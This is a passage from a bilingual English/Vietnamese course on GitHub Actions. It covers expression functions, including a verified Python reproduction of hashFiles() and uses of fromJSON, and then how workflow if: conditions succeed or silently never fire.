<h2>Functions, and <code>hashFiles()</code> reproduced exactly</h2>
<p class="lead">There are about a dozen built-in functions. Most are obvious. Two of them — <code>hashFiles</code> and <code>fromJSON</code> — do things you cannot do any other way, and one of them is worth verifying rather than trusting, because your cache correctness depends on it.</p>

<h3>The straightforward ones</h3>
<div class="kv-grid">
<div class="kv"><span class="k"><code>contains(a, b)</code></span><span class="v">substring if <code>a</code> is a string, membership if <code>a</code> is an array. <code>contains(github.event.head_commit.message, '[skip ci]')</code> is the common use — and note that a commit message is attacker-controlled text, so keep it in a condition, never in a <code>run:</code></span></div>
<div class="kv"><span class="k"><code>startsWith</code> / <code>endsWith</code></span><span class="v">the right way to ask "is this a tag" — <code>startsWith(github.ref, 'refs/tags/')</code></span></div>
<div class="kv"><span class="k"><code>format(s, ...)</code></span><span class="v">positional substitution with <code>{0}</code>, <code>{1}</code>. Literal braces are doubled: <code>{{</code>. Prefer it over concatenation, which the language does not have</span></div>
<div class="kv"><span class="k"><code>join(arr, sep)</code></span><span class="v">array to string. Pairs with the <code>.*</code> operator: <code>join(github.event.commits.*.id, ', ')</code></span></div>
<div class="kv"><span class="k"><code>toJSON(x)</code></span><span class="v">pretty-printed JSON. The debugging tool from 3.2 — and the thing you pass through <code>env:</code>, never into <code>run:</code></span></div>
<div class="kv"><span class="k"><code>fromJSON(s)</code></span><span class="v">parse. Two real uses below, and both are the only way to do what they do</span></div>
</div>

<h3><code>hashFiles()</code> — what it computes, verified</h3>
<p>The documented algorithm is: SHA-256 each matched file, concatenate those hashes, SHA-256 the result. That is six lines to reproduce:</p>

<pre><code>def hash_files(*pats):
    fs = sorted(set(f for p in pats for f in glob(p) if isfile(f)))
    outer = sha256()
    for f in fs:
        inner = sha256(open(f,'rb').read()).hexdigest()
        outer.update(bytes.fromhex(inner))   <span class="tok-comment"># NOI DANG NHI PHAN</span>
    return outer.hexdigest()</code></pre>

<p>Reproducing it is easy; knowing whether the reproduction is <em>right</em> is the interesting part. This repository has a real run that printed a cache key built from <code>hashFiles</code>. So: compute the prediction for <code>frontend/package-lock.json</code> at that run&#39;s commit, then read the log.</p>

<div class="out">--- du doan, tinh o day tu commit d6b9378 ---
e3a98579f5ab829e8a203be5fba4a6a7e7e45cf2b337e9ab7d5d97d624663a5b

--- log that, job 85355071479 ---
Cache hit occurred on the primary key
  nextjs-cache-Linux-frontend-lock-e3a98579f5ab829e8a203be5fba4a6a7e7e45cf2b337e9ab7d5d97d624663a5b</div>

<div class="callout ok">
<p><strong>Exact match, all sixty-four hex characters.</strong> The reproduction is correct, which means three things are now known rather than assumed: the concatenation is of <em>binary</em> hashes not hex strings, the file list is <em>sorted</em>, and the algorithm has no salt or repository-specific component. That last one matters — the same file content gives the same key in any repository, which is why a cache key that contains only <code>hashFiles</code> and no OS is a key that can collide across platforms.</p>
</div>

<p>The sorting is verifiable independently, and worth doing because it is the property you rely on when a key covers several files:</p>

<div class="out">hashFiles('desktop/package-lock.json', 'frontend/package-lock.json')
  = 1271543c845c48107e3572700c94be37cc1c4cfe4c851f378b37a59dd57d111e
hashFiles('frontend/package-lock.json', 'desktop/package-lock.json')
  = 1271543c845c48107e3572700c94be37cc1c4cfe4c851f378b37a59dd57d111e
                                                        GIONG NHAU</div>

<div class="pitfall">
<p><strong>Bẫy — <code>hashFiles</code> returns an empty string when nothing matches.</strong> No error, no warning. A cache key with a typo in the glob becomes <code>my-cache-</code> — a constant, shared by every run, that never invalidates. So the cache is restored from a stale entry forever and the workflow looks fast right up until it is wrong. If a cache key ends in a dash in your logs, that is what happened.</p>
</div>

<h3><code>fromJSON()</code> — the two things it is actually for</h3>
<p><strong>First: a matrix computed at run time.</strong> A matrix must be literal YAML, which means you cannot loop over something discovered during the run — unless the matrix value is a string that <code>fromJSON</code> parses:</p>

<pre><code>jobs:
  tim:
    outputs:
      ds: \${{ steps.q.outputs.ds }}
    steps:
      - id: q
        run: echo "ds=[\\"a\\",\\"b\\",\\"c\\"]" &gt;&gt; \$GITHUB_OUTPUT

  chay:
    needs: tim
    strategy:
      matrix:
        muc: \${{ fromJSON(needs.tim.outputs.ds) }}</code></pre>

<p><strong>Second: getting a real type out of a string.</strong> Everything from <code>\$GITHUB_OUTPUT</code> and every <code>workflow_dispatch</code> input is a string — including the ones declared <code>type: boolean</code>, as 3.3 measured. <code>fromJSON('true')</code> is the boolean <code>true</code>, and <code>fromJSON(inputs.co_deploy)</code> converts the input to something a condition can use directly. The alternative, <code>inputs.co_deploy == 'true'</code>, is equally correct and easier to read; use whichever, but do use one of them.</p>

<div class="callout warn">
<p><strong><code>fromJSON</code> on a value you do not control is a parser you did not audit, running on attacker input.</strong> Feeding it a branch name, a PR body or an artifact&#39;s contents means arbitrary structure enters your expression evaluation and, through a computed matrix, arbitrary job definitions. Use it on values your own workflow produced.</p>
</div>

<h3>A cache key that is actually correct</h3>
<p>Putting 3.2 and this lesson together, the key from this repository reads exactly as it should:</p>

<pre><code>key: nextjs-cache-\${{ runner.os }}-frontend-lock-\${{ hashFiles('frontend/package-lock.json') }}</code></pre>

<div class="lz-flow">
<div class="lz-step"><span class="lz-k">a literal prefix</span><span class="lz-t"><code>nextjs-cache-</code></span><span class="lz-d">names what is in it, so a human reading the cache list can tell</span></div>
<div class="lz-step"><span class="lz-k">the platform</span><span class="lz-t"><code>\${{ runner.os }}</code></span><span class="lz-d">expands to <code>Linux</code>, visible in the log above. Without it, a macOS job could restore a Linux cache</span></div>
<div class="lz-step"><span class="lz-k">the content hash</span><span class="lz-t"><code>hashFiles(...)</code></span><span class="lz-d">changes exactly when the dependency set changes, and not otherwise</span></div>
</div>

<div class="callout">
<p><strong>The one sentence.</strong> Functions are the only computation the expression language has, <code>hashFiles</code> is the one whose behaviour your build correctness rests on, and it is reproducible in six lines — so it can be checked rather than believed.</p>
</div>

<h3>Sources</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Expressions: functions</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/expressions#functions — all built-in functions with their exact signatures, including the statement of the <code>hashFiles</code> algorithm reproduced and verified above.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">actions/toolkit — the hashFiles implementation</span><span class="lc-sub">github.com/actions/toolkit — the runner-side source, for when the documented description leaves a question open (for example, whether the concatenation is of binary digests or hex strings; it is binary).</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Using a matrix: dynamic matrices with fromJSON</span><span class="lc-sub">docs.github.com/en/actions/using-jobs/using-a-matrix-for-your-jobs#using-a-matrix-from-a-job-output — the job-output-to-matrix pattern shown above, which is the only supported way to build a matrix from discovered data.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Docker — layer caching, content hashes, and what actually invalidates</span><span class="lc-sub">/courses/docker/learn${REF} — the same idea in a build system that lives or dies by it: a cache key is a claim about what a result depends on, and the bugs come from the claim being wrong rather than from the cache.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Authentication — hashing, and why the encoding of the input matters</span><span class="lc-sub">/courses/authentication/learn${REF} — hex versus binary is not a detail: hashing the same bytes two ways gives two different answers, which is exactly the question the verification above settled.</span></span></div>
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 3 · Bài 3.4</span>
<h2>Hàm, và <code>hashFiles()</code> tái lập KHỚP CHÍNH XÁC</h2>
<p class="lead">Có khoảng chục hàm dựng sẵn. Phần lớn là hiển nhiên. Hai trong số đó — <code>hashFiles</code> và <code>fromJSON</code> — làm những việc không cách nào khác làm được, và một trong hai đáng được KIỂM CHỨNG thay vì tin tưởng, bởi tính đúng đắn của cache bạn dựa vào nó.</p>

<h3>Những cái thẳng thắn</h3>
<div class="kv-grid">
<div class="kv"><span class="k"><code>contains(a, b)</code></span><span class="v">chuỗi con nếu <code>a</code> là chuỗi, phép thuộc nếu <code>a</code> là mảng. <code>contains(github.event.head_commit.message, '[skip ci]')</code> là cách dùng phổ biến — và nhớ rằng thông điệp commit là phần chữ do kẻ tấn công kiểm soát, nên hãy giữ nó trong một điều kiện, đừng bao giờ đưa vào <code>run:</code></span></div>
<div class="kv"><span class="k"><code>startsWith</code> / <code>endsWith</code></span><span class="v">cách đúng để hỏi "đây có phải một tag không" — <code>startsWith(github.ref, 'refs/tags/')</code></span></div>
<div class="kv"><span class="k"><code>format(s, ...)</code></span><span class="v">thay theo vị trí với <code>{0}</code>, <code>{1}</code>. Ngoặc nhọn viết thật thì gấp đôi: <code>{{</code>. Ưu tiên nó hơn phép ghép chuỗi, thứ mà ngôn ngữ này KHÔNG có</span></div>
<div class="kv"><span class="k"><code>join(mang, dau)</code></span><span class="v">mảng thành chuỗi. Đi cặp với toán tử <code>.*</code>: <code>join(github.event.commits.*.id, ', ')</code></span></div>
<div class="kv"><span class="k"><code>toJSON(x)</code></span><span class="v">JSON in đẹp. Công cụ gỡ lỗi ở bài 3.2 — và là thứ bạn truyền qua <code>env:</code>, không bao giờ đổ vào <code>run:</code></span></div>
<div class="kv"><span class="k"><code>fromJSON(s)</code></span><span class="v">phân tích cú pháp. Hai cách dùng thật ở dưới, và cả hai là cách DUY NHẤT làm được điều chúng làm</span></div>
</div>

<h3><code>hashFiles()</code> — nó tính cái gì, đã kiểm chứng</h3>
<p>Thuật toán trong tài liệu là: SHA-256 từng file khớp mẫu, nối các hash ấy lại, rồi SHA-256 kết quả. Chỉ sáu dòng để tái lập:</p>

<pre><code>def hash_files(*pats):
    fs = sorted(set(f for p in pats for f in glob(p) if isfile(f)))
    outer = sha256()
    for f in fs:
        inner = sha256(open(f,'rb').read()).hexdigest()
        outer.update(bytes.fromhex(inner))   <span class="tok-comment"># NOI DANG NHI PHAN</span>
    return outer.hexdigest()</code></pre>

<p>Tái lập thì dễ; biết được bản tái lập có <em>ĐÚNG</em> hay không mới là phần thú vị. Kho này có một lần chạy thật đã in ra một khoá cache dựng từ <code>hashFiles</code>. Vậy thì: tính dự đoán cho <code>frontend/package-lock.json</code> tại commit của lần chạy ấy, rồi đọc log.</p>

<div class="out">--- du doan, tinh o day tu commit d6b9378 ---
e3a98579f5ab829e8a203be5fba4a6a7e7e45cf2b337e9ab7d5d97d624663a5b

--- log that, job 85355071479 ---
Cache hit occurred on the primary key
  nextjs-cache-Linux-frontend-lock-e3a98579f5ab829e8a203be5fba4a6a7e7e45cf2b337e9ab7d5d97d624663a5b</div>

<div class="callout ok">
<p><strong>Khớp chính xác, cả sáu mươi tư ký tự hex.</strong> Bản tái lập đúng, nghĩa là ba điều giờ đã BIẾT chứ không còn là phỏng đoán: phép nối là nối các hash dạng <em>NHỊ PHÂN</em> chứ không phải chuỗi hex, danh sách file được <em>SẮP XẾP</em>, và thuật toán KHÔNG có muối hay thành phần riêng theo kho. Cái cuối có nghĩa — cùng nội dung file cho cùng một khoá ở BẤT KỲ kho nào, và đó là lý do một khoá cache chỉ chứa <code>hashFiles</code> mà không chứa hệ điều hành là một khoá VA CHẠM ĐƯỢC giữa các nền tảng.</p>
</div>

<p>Việc sắp xếp thì kiểm chứng độc lập được, và đáng làm vì đó là tính chất bạn dựa vào khi một khoá phủ nhiều file:</p>

<div class="out">hashFiles('desktop/package-lock.json', 'frontend/package-lock.json')
  = 1271543c845c48107e3572700c94be37cc1c4cfe4c851f378b37a59dd57d111e
hashFiles('frontend/package-lock.json', 'desktop/package-lock.json')
  = 1271543c845c48107e3572700c94be37cc1c4cfe4c851f378b37a59dd57d111e
                                                        GIONG NHAU</div>

<div class="pitfall">
<p><strong>Bẫy — <code>hashFiles</code> trả về CHUỖI RỖNG khi không có gì khớp.</strong> Không lỗi, không cảnh báo. Một khoá cache có mẫu glob gõ sai sẽ thành <code>my-cache-</code> — một hằng số, dùng chung cho mọi lần chạy, không bao giờ hết hiệu lực. Nên cache cứ được phục hồi từ một mục cũ mãi mãi và workflow trông nhanh cho tới đúng lúc nó SAI. Nếu một khoá cache trong log của bạn kết thúc bằng một dấu gạch ngang, thì chuyện đó vừa xảy ra.</p>
</div>

<h3><code>fromJSON()</code> — hai việc nó thật sự dùng để làm</h3>
<p><strong>Một: một ma trận TÍNH RA LÚC CHẠY.</strong> Một ma trận phải là YAML viết sẵn, nghĩa là bạn không lặp được trên thứ gì khám phá ra trong lúc chạy — trừ khi giá trị ma trận là một chuỗi mà <code>fromJSON</code> phân tích ra:</p>

<pre><code>jobs:
  tim:
    outputs:
      ds: \${{ steps.q.outputs.ds }}
    steps:
      - id: q
        run: echo "ds=[\\"a\\",\\"b\\",\\"c\\"]" &gt;&gt; \$GITHUB_OUTPUT

  chay:
    needs: tim
    strategy:
      matrix:
        muc: \${{ fromJSON(needs.tim.outputs.ds) }}</code></pre>

<p><strong>Hai: lấy được một KIỂU THẬT ra từ một chuỗi.</strong> Mọi thứ tới từ <code>\$GITHUB_OUTPUT</code> và mọi tham số <code>workflow_dispatch</code> đều là chuỗi — kể cả những cái khai <code>type: boolean</code>, như bài 3.3 đã đo. <code>fromJSON('true')</code> là boolean <code>true</code>, và <code>fromJSON(inputs.co_deploy)</code> chuyển tham số thành thứ một điều kiện dùng thẳng được. Cách kia, <code>inputs.co_deploy == 'true'</code>, cũng đúng ngang và dễ đọc hơn; dùng cái nào cũng được, nhưng phải dùng MỘT trong hai.</p>

<div class="callout warn">
<p><strong><code>fromJSON</code> trên một giá trị bạn không kiểm soát là một bộ phân tích bạn chưa soát, chạy trên dữ liệu của kẻ tấn công.</strong> Cho nó ăn một tên nhánh, một thân PR hay nội dung một artifact nghĩa là cấu trúc tuỳ ý đi vào quá trình tính biểu thức của bạn và, qua một ma trận tính lúc chạy, đi vào những định nghĩa job tuỳ ý. Hãy dùng nó trên những giá trị chính workflow của bạn sinh ra.</p>
</div>

<h3>Một khoá cache thật sự đúng</h3>
<p>Ghép bài 3.2 với bài này, cái khoá của kho này đọc lên đúng như nó phải thế:</p>

<pre><code>key: nextjs-cache-\${{ runner.os }}-frontend-lock-\${{ hashFiles('frontend/package-lock.json') }}</code></pre>

<div class="lz-flow">
<div class="lz-step"><span class="lz-k">một tiền tố viết thật</span><span class="lz-t"><code>nextjs-cache-</code></span><span class="lz-d">gọi tên thứ nằm trong đó, để một con người đọc danh sách cache còn biết được</span></div>
<div class="lz-step"><span class="lz-k">nền tảng</span><span class="lz-t"><code>\${{ runner.os }}</code></span><span class="lz-d">nở ra thành <code>Linux</code>, nhìn thấy được trong log bên trên. Thiếu nó thì một job macOS có thể phục hồi một cache của Linux</span></div>
<div class="lz-step"><span class="lz-k">hash nội dung</span><span class="lz-t"><code>hashFiles(...)</code></span><span class="lz-d">đổi đúng khi tập phụ thuộc đổi, và không đổi vào lúc nào khác</span></div>
</div>

<div class="callout">
<p><strong>Một câu.</strong> Hàm là phép tính DUY NHẤT mà ngôn ngữ biểu thức có, <code>hashFiles</code> là cái mà tính đúng đắn bản dựng của bạn dựa lên, và nó tái lập được trong sáu dòng — nên nó KIỂM được thay vì phải TIN.</p>
</div>

<h3>Nguồn</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Expressions: functions</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/expressions#functions — mọi hàm dựng sẵn kèm chữ ký chính xác, gồm cả phát biểu thuật toán <code>hashFiles</code> đã tái lập và kiểm chứng bên trên.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">actions/toolkit — phần cài đặt hashFiles</span><span class="lc-sub">github.com/actions/toolkit — mã nguồn phía runner, cho những lúc mô tả trong tài liệu để ngỏ một câu hỏi (ví dụ, phép nối là nối digest nhị phân hay chuỗi hex; câu trả lời là NHỊ PHÂN).</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Using a matrix: ma trận động với fromJSON</span><span class="lc-sub">docs.github.com/en/actions/using-jobs/using-a-matrix-for-your-jobs#using-a-matrix-from-a-job-output — khuôn mẫu output-của-job-thành-ma-trận trình bày bên trên, cách DUY NHẤT được hỗ trợ để dựng một ma trận từ dữ liệu khám phá ra.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Docker — cache theo tầng, hash nội dung, và cái gì THẬT SỰ làm mất hiệu lực</span><span class="lc-sub">/courses/docker/learn${REF} — cùng ý tưởng ấy trong một hệ dựng sống chết vì nó: một khoá cache là một LỜI KHẲNG ĐỊNH về việc một kết quả phụ thuộc vào cái gì, và lỗi tới từ lời khẳng định sai chứ không tới từ cache.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Authentication — băm, và vì sao cách mã hoá đầu vào có ý nghĩa</span><span class="lc-sub">/courses/authentication/learn${REF} — hex với nhị phân không phải chuyện vặt: băm cùng một chuỗi byte theo hai cách cho hai đáp án khác nhau, và đó đúng là câu hỏi mà phép kiểm chứng bên trên đã trả lời xong.</span></span></div>
</div>
`,
    },

    /* ─────────────────────────── 3.5 ─────────────────────────── */
    {
      title: '3.5 — Conditions in practice, and the ones that never fire|||3.5 — Điều kiện trong thực tế, và những cái không bao giờ nổ',
      slug: 'ga-3-5-dieu-kien',
      type: 'VIDEO',
      description: 'Kiểm kê: cả 11 workflow chỉ có BA điều kiện `if:`. Cả ba đều đúng, và mỗi cái minh hoạ một luật khác nhau của Chương 3. Cộng bốn điều kiện phổ biến KHÔNG BAO GIỜ nổ, và cách phát hiện chúng bằng một lần chạy chứ không bằng đọc tệp.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 3 · Lesson 3.5</span>
<h2>Conditions in practice, and the ones that never fire</h2>
<p class="lead">Search all eleven workflows in this repository for <code>if:</code> and you get three results. Three conditions across 1,394 lines of YAML — which is itself the first finding, and each of the three happens to demonstrate a different rule from this chapter.</p>

<div class="out">$ grep -h "^\\s*if:" .github/workflows/*.yml
if: matrix.os == 'ubuntu-latest'
if: inputs.version != ''
if: always()

3 dieu kien / 11 workflow / 1.394 dong YAML
ca ba deu o muc BUOC, khong cai nao o muc JOB</div>

<div class="callout ok">
<p><strong>Three is a good number, and it is worth saying why.</strong> A condition is a branch, and a branch in CI is a path that is not exercised on most runs. A workflow with twenty <code>if:</code> conditions has a large number of configurations, almost all of which have never run — so the one that matters during an incident is usually one nobody has seen work. Conditions earn their place; they do not come free.</p>
</div>

<h3>The three, and what each one gets right</h3>

<p><strong>1. <code>if: matrix.os == 'ubuntu-latest'</code></strong> — on a step that installs Linux system libraries. This is the platform-specific step from Chapter 2, and lesson 2.3 measured what the condition buys: 24 seconds on Linux, and <strong>0 seconds</strong> on macOS and Windows where it is skipped. It also compares a string to a string, which 3.3 argued for.</p>

<p><strong>2. <code>if: inputs.version != ''</code></strong> — on the step that sets the package version. The explicit comparison against the empty string is doing real work here:</p>

<div class="lz-flow">
<div class="lz-step"><span class="lz-k">written this way</span><span class="lz-t"><code>inputs.version != ''</code></span><span class="lz-d">false when the input is absent; the step is skipped and the existing version stands</span></div>
<div class="lz-step"><span class="lz-k">if it had been</span><span class="lz-t"><code>if: inputs.version</code></span><span class="lz-d">would work too — an empty string is falsy — but stops working the moment somebody passes <code>'0'</code> or <code>'false'</code>, which are truthy strings</span></div>
<div class="lz-step"><span class="lz-k">what it prevents</span><span class="lz-t"><code>npm version ""</code></span><span class="lz-d">running the version command with an empty argument, which is a failure at a strange moment rather than a skip</span></div>
</div>

<p><strong>3. <code>if: always()</code></strong> — on the artifact upload. This is the case 3.3 named as the legitimate one, and the workflow file says so in its own comment: <em>if the build dies partway, whatever finished is still downloadable</em>. It uploads a file. It does not touch anything outside the run. That is exactly the boundary — <code>always()</code> is right for collecting evidence and wrong for taking action.</p>

<h3>Four conditions that never fire</h3>
<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname"><code>if: 'false'</code> — the quoted boolean</span><span class="lz-lnote">measured in 3.3: YAML hands the expression engine the <em>string</em> <code>false</code>, which is non-empty, which is true. The step runs. This one fires when it should not, which is worse than never firing</span></div>
<div class="lz-layer"><span class="lz-lname"><code>if: steps.abc.conclusion == 'failure'</code> on a tolerated step</span><span class="lz-lnote">never true. <code>continue-on-error</code> rewrites <code>conclusion</code> to <code>success</code>; the pre-tolerance result is <code>outcome</code>. So the reporting step you added specifically to surface tolerated failures is the one step that can never run</span></div>
<div class="lz-layer"><span class="lz-lname"><code>if: github.ref == 'main'</code></span><span class="lz-lnote">never true. <code>github.ref</code> is <code>refs/heads/main</code>, and on a pull request it is <code>refs/pull/&lt;N&gt;/merge</code> — measured in 1.4. Use <code>github.ref_name</code> if you want the short form</span></div>
<div class="lz-layer"><span class="lz-lname"><code>if: needs.dung.result == 'success'</code> where <code>dung</code> is not in <code>needs:</code></span><span class="lz-lnote">never true. The <code>needs</code> context only contains jobs this job declared a dependency on; anything else is empty, and <code>'' == 'success'</code> is false</span></div>
</div>

<div class="callout warn">
<p><strong>All four fail silently, and three of them fail closed.</strong> A step that never runs produces no log line saying so beyond the word "skipped" on the run page, which looks identical to a step that was <em>meant</em> to be skipped. Nothing warns you. The only reliable detection is to look at a real run and check that the steps you expected to be skipped were skipped, and the ones you expected to run ran.</p>
</div>

<h3>The path-filter fix from 1.5, written properly</h3>
<p>Lesson 1.5 showed why <code>paths:</code> on a <code>pull_request</code> trigger blocks a required check forever, and said the fix is to move the condition inside the job. This is what that looks like:</p>

<pre><code>jobs:
  kiem:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
      - id: doi
        run: |
          <span class="tok-comment"># co file nao trong src/ doi khong?</span>
          if git diff --name-only origin/\${{ github.base_ref }}...HEAD \\
             | grep -q '^src/'; then
            echo "co=true" &gt;&gt; \$GITHUB_OUTPUT
          else
            echo "co=false" &gt;&gt; \$GITHUB_OUTPUT
          fi

      - name: Kiem kieu
        if: steps.doi.outputs.co == 'true'
        run: npx tsc --noEmit</code></pre>

<div class="callout">
<p><strong>The job always runs, so the required check always reports.</strong> When nothing relevant changed the expensive step is skipped and the job finishes green in a few seconds, which is what branch protection needs. Note the comparison: <code>steps.doi.outputs.co == 'true'</code> against the string, because step outputs are always strings — <code>if: steps.doi.outputs.co</code> would be true for both <code>'true'</code> and <code>'false'</code>, which is 3.3&#39;s trap arriving through the back door.</p>
</div>

<div class="pitfall">
<p><strong>Bẫy — <code>git diff</code> in that step needs history the default checkout does not fetch.</strong> <code>actions/checkout</code> defaults to <code>fetch-depth: 1</code>: one commit, no base branch, no merge base. The diff above will fail with <code>unknown revision</code>. Either add <code>fetch-depth: 0</code> — which fetches everything, and on a large repository that is a real cost — or use an action built for this, which fetches only what it needs. This is the single most common reason a hand-written changed-files step does not work first time.</p>
</div>

<h3>Where to put a condition</h3>
<div class="kv-grid">
<div class="kv"><span class="k">on a step</span><span class="v">cheapest. The job still starts, so its check still reports; a skipped step costs 0 seconds, measured in 2.4</span></div>
<div class="kv"><span class="k">on a job</span><span class="v">skips the whole job — and remember that skips <strong>propagate</strong> to everything with <code>needs:</code> on it. A conditional job in the middle of a chain disables the rest of the chain, which is usually not the intent</span></div>
<div class="kv"><span class="k">on the trigger (<code>paths:</code>, <code>branches:</code>)</span><span class="v">cheapest of all — nothing starts — but invisible to required checks. Correct for <code>push</code>, dangerous for <code>pull_request</code></span></div>
<div class="kv"><span class="k">inside the script</span><span class="v">an <code>if</code> in bash. Fine, and sometimes clearer — but the step reports success either way, so the run page cannot show you which path was taken. Prefer the workflow-level <code>if:</code> when you want the skip to be visible</span></div>
</div>

<div class="callout ok">
<p><strong>The one sentence.</strong> Every condition adds a configuration that most runs do not exercise, so the useful discipline is to write few of them, compare strings explicitly, and verify each one against a run that shows the skip — because the file cannot tell you whether a condition works, and the run page can.</p>
</div>

<h3>Sources</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Workflow syntax: jobs.&lt;id&gt;.steps[*].if</span><span class="lc-sub">docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstepsif — where <code>if:</code> is allowed, the implicit <code>success()</code>, and the note that braces are optional because the value is already an expression.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">actions/checkout — fetch-depth</span><span class="lc-sub">github.com/actions/checkout#usage — the <code>fetch-depth: 1</code> default and what <code>0</code> costs, which is the answer to the <code>git diff</code> pitfall above.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Contexts: the steps context</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/contexts#steps-context — the definitions of <code>outcome</code> and <code>conclusion</code> side by side, which is the clearest statement of the difference that breaks the second dead condition above.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Deploy VPS — the branch you never take is the branch that is broken</span><span class="lc-sub">/courses/deploy-vps/learn${REF} — a rollback path that had never been exercised and did not work when it was needed, and the practice of running the unusual branch on purpose before you need it.</span></span></div>
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 3 · Bài 3.5</span>
<h2>Điều kiện trong thực tế, và những cái không bao giờ nổ</h2>
<p class="lead">Tìm <code>if:</code> trong cả mười một workflow của kho này thì được BA kết quả. Ba điều kiện trên 1.394 dòng YAML — bản thân điều đó đã là phát hiện thứ nhất, và mỗi cái trong ba lại tình cờ minh hoạ một luật khác nhau của chương này.</p>

<div class="out">$ grep -h "^\\s*if:" .github/workflows/*.yml
if: matrix.os == 'ubuntu-latest'
if: inputs.version != ''
if: always()

3 dieu kien / 11 workflow / 1.394 dong YAML
ca ba deu o muc BUOC, khong cai nao o muc JOB</div>

<div class="callout ok">
<p><strong>Ba là một con số tốt, và đáng nói vì sao.</strong> Một điều kiện là một NHÁNH, và một nhánh trong CI là một đường không được đi qua ở phần lớn các lần chạy. Một workflow có hai mươi điều kiện <code>if:</code> thì có một số lượng lớn cấu hình, mà gần hết chúng chưa từng chạy — nên cái có ý nghĩa trong lúc sự cố thường là cái chưa ai thấy nó hoạt động. Điều kiện phải TỰ KIẾM chỗ đứng của nó; nó không miễn phí.</p>
</div>

<h3>Ba cái đó, và mỗi cái làm đúng chuyện gì</h3>

<p><strong>1. <code>if: matrix.os == 'ubuntu-latest'</code></strong> — trên một bước cài thư viện hệ thống của Linux. Đây là bước phụ thuộc nền tảng của Chương 2, và bài 2.3 đã đo cái điều kiện ấy mua được gì: 24 giây trên Linux, và <strong>0 giây</strong> trên macOS với Windows nơi nó bị bỏ qua. Nó cũng so CHUỖI với CHUỖI, đúng thứ bài 3.3 lập luận.</p>

<p><strong>2. <code>if: inputs.version != ''</code></strong> — trên bước đặt phiên bản của gói. Phép so sánh tường minh với chuỗi rỗng ở đây đang làm việc thật:</p>

<div class="lz-flow">
<div class="lz-step"><span class="lz-k">viết như thế này</span><span class="lz-t"><code>inputs.version != ''</code></span><span class="lz-d">sai khi tham số vắng mặt; bước bị bỏ qua và phiên bản đang có được giữ nguyên</span></div>
<div class="lz-step"><span class="lz-k">nếu đã viết là</span><span class="lz-t"><code>if: inputs.version</code></span><span class="lz-d">cũng chạy được — chuỗi rỗng là SAI — nhưng thôi chạy đúng ngay khoảnh khắc có người truyền vào <code>'0'</code> hay <code>'false'</code>, những chuỗi ĐÚNG</span></div>
<div class="lz-step"><span class="lz-k">nó ngăn được gì</span><span class="lz-t"><code>npm version ""</code></span><span class="lz-d">chạy lệnh đặt phiên bản với một tham số rỗng, tức một cú hỏng ở một thời điểm kỳ quặc chứ không phải một lần bỏ qua</span></div>
</div>

<p><strong>3. <code>if: always()</code></strong> — trên bước tải artifact lên. Đây đúng là ca mà bài 3.3 gọi tên là chính đáng, và chính tệp workflow nói ra điều đó trong bình luận của nó: <em>dựng hỏng giữa chừng thì phần đã xong vẫn tải về xem được</em>. Nó TẢI MỘT TỆP LÊN. Nó không chạm vào bất cứ thứ gì ngoài lần chạy. Đó chính xác là ranh giới — <code>always()</code> đúng cho việc THU THẬP BẰNG CHỨNG và sai cho việc RA TAY HÀNH ĐỘNG.</p>

<h3>Bốn điều kiện không bao giờ nổ</h3>
<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname"><code>if: 'false'</code> — cái boolean bị đặt nháy</span><span class="lz-lnote">đo ở bài 3.3: YAML trao cho bộ máy biểu thức <em>CHUỖI</em> <code>false</code>, chuỗi ấy khác rỗng, tức là ĐÚNG. Bước CHẠY. Cái này nổ đúng lúc lẽ ra nó không được nổ, mà như thế còn tệ hơn là không bao giờ nổ</span></div>
<div class="lz-layer"><span class="lz-lname"><code>if: steps.abc.conclusion == 'failure'</code> trên một bước được dung thứ</span><span class="lz-lnote">không bao giờ đúng. <code>continue-on-error</code> viết lại <code>conclusion</code> thành <code>success</code>; kết quả trước-khi-dung-thứ là <code>outcome</code>. Nên cái bước báo cáo mà bạn thêm vào ĐÚNG ĐỂ phơi bày các cú hỏng được dung thứ lại chính là bước không bao giờ chạy được</span></div>
<div class="lz-layer"><span class="lz-lname"><code>if: github.ref == 'main'</code></span><span class="lz-lnote">không bao giờ đúng. <code>github.ref</code> là <code>refs/heads/main</code>, và trên một pull request nó là <code>refs/pull/&lt;N&gt;/merge</code> — đo ở bài 1.4. Muốn dạng ngắn thì dùng <code>github.ref_name</code></span></div>
<div class="lz-layer"><span class="lz-lname"><code>if: needs.dung.result == 'success'</code> mà <code>dung</code> không có trong <code>needs:</code></span><span class="lz-lnote">không bao giờ đúng. Context <code>needs</code> chỉ chứa những job mà job này đã khai là phụ thuộc; thứ gì khác đều rỗng, và <code>'' == 'success'</code> là SAI</span></div>
